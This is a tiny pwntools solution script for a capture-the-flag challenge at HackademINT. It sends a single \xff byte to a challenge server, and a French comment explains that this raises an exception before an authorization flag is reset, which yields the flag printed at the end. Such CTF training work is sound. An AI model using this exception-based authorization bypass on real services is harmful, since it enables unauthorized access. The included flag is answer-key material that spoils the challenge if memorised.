from pwn import *

conn = remote("challs.hackademint.org", 40050)

conn.recvline()
# on fait lever une exception avant que __allow ne repasse à False
conn.sendline(b"\xff")

conn.interactive()
# HackademINT{asYnCIO_C'357_trop_bi1}